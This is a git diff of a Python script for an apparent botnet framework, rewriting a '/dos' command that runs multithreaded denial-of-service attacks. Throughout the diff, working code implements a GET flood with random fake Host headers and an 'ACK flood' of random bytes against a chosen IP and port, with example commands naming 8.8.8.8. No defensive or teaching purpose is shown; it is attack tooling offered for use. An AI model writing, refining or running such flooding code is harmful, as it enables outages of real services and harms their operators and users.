@@ -1,6 +1,3 @@
-
-
-
 import socket
 import random
 import logging
@@ -11,7 +8,6 @@ from ..utils import simple_serializer
 
 _logger = logging.getLogger(f"--> {__name__}  ")
 
-# TODO: Improve this Script!
 
 @BotNet.default_script(script_version="0.0.1")
 def dos(context: Context) -> str:
@@ -19,74 +15,106 @@ def dos(context: Context) -> str:
     Denial-Of-Service Attack.
 
     syntax:
-        `/dos <attack-type{GETFlood,ACKFlood}> <ipv4> <port> <thread-number> <count>`
+        `/dos GETFlood <thread-number> <count> <ipv4> <port>`
+        `/dos ACKFlood <thread-number> <count> <ipv4> <port>`
 
     example command:
-        `/dos GETFlood 8.8.8.8 443 10 1000`
-        `/dos ACKFlood 8.8.8.8 443 10 1000` 
+        `/dos GETFlood 10 100 8.8.8.8 80`
+        `/dos ACKFlood 10 100 8.8.8.8 80`
 
-    GETFlood: send GET request to target
-    ACKFlood: send random data to target
+    GETFlood: send http GET request to target `/` route
+    ACKFlood: send random data to target ip:port
     """
-    command, err = simple_serializer(context.command, [str, str, int, int, int])
-    if err:
-        raise UserException(err)
-    
-    DOSTYPE = command[0]
-    TARGET = command[1]
-    PORT = command[2]
-    THREAD_NUM = command[3]
-    COUNT = command[4]
+    command = context.command
 
-    try:
-        # validate tareget ip
-        _logger.debug(f"Checking IP {TARGET} on port {PORT}")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((TARGET, PORT))
-        s.close()
-    except:
-        _logger.debug(f"Connect to IP {TARGET} on port {PORT} failed, Is the IP correct?")
-        raise UserException(f"Connect to IP {TARGET} on port {PORT} failed, Is the IP correct?")
+    if len(command) == 0:
+        raise UserException("dos type `None` not found")
+
+    DOSTYPE = command[0]
+
+    # GETFlood: send http GET request to target `/` route
+    if DOSTYPE == "GETFlood":
+        command, err = simple_serializer(command, [str, int, int, str, int])
+        if err:
+            raise UserException(err)
+
+        THREAD_NUM = command[1]
+        COUNT = command[2]
+        IPV4 = command[3]
+        PORT = command[4]
+
+        if not valid_tareget_ip(IPV4, PORT):
+            raise UserException(
+                f"Connect to IP {IPV4} on port {PORT} failed, don't start dos"
+            )
+        return _start_dos(GETFlood, THREAD_NUM, [IPV4, PORT, COUNT])
+
+    # ACKFlood: send random data to target ip:port
+    elif DOSTYPE == "ACKFlood":
+        command, err = simple_serializer(command, [str, int, int, str, int])
+        if err:
+            raise UserException(err)
+
+        THREAD_NUM = command[1]
+        COUNT = command[2]
+        IPV4 = command[3]
+        PORT = command[4]
+
+        if not valid_tareget_ip(IPV4, PORT):
+            raise UserException(
+                f"Connect to IP {IPV4} on port {PORT} failed, don't start dos"
+            )
+        return _start_dos(ACKFlood, THREAD_NUM, [IPV4, PORT, COUNT])
 
     else:
+        raise UserException(f"dos type `{DOSTYPE}` not found")
 
+
+def valid_tareget_ip(IPV4: str, PORT: int) -> bool:
+    """try connect to ip"""
+    try:
+        _logger.debug(f"Checking IP {IPV4} on port {PORT}")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IPV4, PORT))
+        s.close()
+        return True
+
+    except:
+        return False
+
+
+def _start_dos(target_func: callable, THREAD_NUM: int, args: list) -> str:
+    for _ in range(THREAD_NUM):
+        thread = threading.Thread(target=target_func, args=args)
+        thread.start()
+    return f"Starting Dos Attack, {target_func.__name__}"
+
+
+def GETFlood(IPV4, PORT, COUNT):
+    """send http GET request to target `/` route"""
+
+    for _ in range(COUNT):
+        fakeip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         try:
-            _logger.debug("Starting Dos Attack...")
-            dos = Dos(TARGET, PORT, DOSTYPE, COUNT)
-            for _ in range(THREAD_NUM):
-                thread = threading.Thread(target=dos.attack)
-                thread.start()
-            return "Starting Dos Attack.."
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IPV4, PORT))
+            s.sendto((f"GET / HTTP/1.1\r\n").encode("ascii"), (IPV4, PORT))
+            s.sendto((f"Host: {fakeip}\r\n\r\n").encode("ascii"), (IPV4, PORT))
+            s.close()
 
         except:
-            _logger.debug("Something Failed. Maybe The Servers Are Down !")
-            return "Something Failed. Maybe The Servers Are Down !"
+            pass
 
 
+def ACKFlood(IPV4, PORT, COUNT):
+    """ACKFlood: send random data to target ip:port"""
 
-class Dos:
-    def __init__(self, TARGET, PORT, DOSTYPE, COUNT):
-        self.TARGET = TARGET
-        self.PORT = PORT
-        self.DOSTYPE = DOSTYPE
-        self.COUNT = COUNT
+    for _ in range(COUNT):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IPV4, PORT))
+            s.sendto((random._urandom(random.randint(50, 400))), (IPV4, PORT))
+            s.close()
 
-    def attack(self):
-        # ACKFlood
-        if self.DOSTYPE == "ACKFlood":
-            print(111)
-            for _ in range(self.COUNT):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.TARGET, self.PORT))
-                s.sendto((random._urandom(random.randint(50,300))), (self.TARGET, self.PORT))
-                s.close()
-        
-        # GETFlood
-        else:
-            fakeip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
-            for _ in range(self.COUNT):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.TARGET, self.PORT))
-                s.sendto((f"GET / {self.TARGET} HTTP/1.1\r\n").encode('ascii'), (self.TARGET, self.PORT))
-                s.sendto((f"Host: {fakeip}\r\n\r\n").encode('ascii'), (self.TARGET, self.PORT))
-                s.close()
+        except:
+            pass
